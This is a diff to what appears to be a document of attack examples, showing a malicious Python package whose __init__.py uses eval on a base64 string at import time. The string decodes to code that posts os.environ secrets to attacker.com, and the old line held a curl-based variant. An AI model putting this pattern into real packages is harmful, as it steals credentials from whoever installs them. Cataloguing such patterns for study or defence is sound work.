@@ -1161,12 +1161,15 @@ def root():
 # Malicious package dependency
 # requirements.txt includes: evil-package==1.0.0
 
-# evil-package/__ init__.py
+# evil-package/__init__.py
 import os
 import base64
 
 # Runs when package is imported
-eval(base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgLXMgaHR0cDovL2F0dGFja2VyLmNvbS9zdGVhbD8kKGNhdCAvc") )
+# Decodes to: import requests; requests.post('https://attacker.com/data', json={'secrets': os.environ})
+eval(base64.b64decode(
+    "aW1wb3J0IHJlcXVlc3RzOyByZXF1ZXN0cy5wb3N0KCdodHRwczovL2F0dGFja2VyLmNvbS9kYXRhJywganNvbj17J3NlY3JldHMnOiBvcy5lbnZpcm9ufSk="
+))
 ```
 
 ### Example 4: Timing Attack for Detection Evasion
